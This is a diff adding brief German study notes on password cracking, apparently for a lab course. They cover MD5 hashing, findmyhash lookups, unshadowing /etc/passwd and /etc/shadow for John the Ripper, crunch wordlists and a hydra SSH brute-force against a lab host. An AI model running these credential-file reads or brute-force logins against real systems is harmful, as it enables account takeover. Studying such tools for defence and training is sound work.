@@ -1,0 +1,46 @@
+wörterbücher
+
+
+====Hash bilden
+echo -n 1234|md5sum
+1b4c03bdf0ad564949458e6eeae6a420
+
+indmyhash MD5 -h 1b4c03bdf0ad564949458e6eeae6a420
+
+und
+
+findmyhash MD5 -g 1b4c03bdf0ad564949458e6eeae6a420
+
+unshadow /etc/passwd /etc/shadow > linuxpasswd
+
+john linuxpasswd
+
+
+
+Passwortlisten
+
+crunch 1 4 abc
+
+crunch 1 8 abc
+
+
+/usr/share/rainbowcrack/charset.txt
+
+crunch 1 12 /usr/share/rainbowcrack/charset.txt ascii-32-95
+
+
+rainbowtable bereits gehaschte passwortliste
+
+cracking ==> offline
+
+
+
+hydra -t 4 -l msfadmin -P passwd 10.10.10.103 ssh
+passwd ist das passwd file
+# -t = Anzahl Tries
+-l username 
+-P file
+
+
+
+
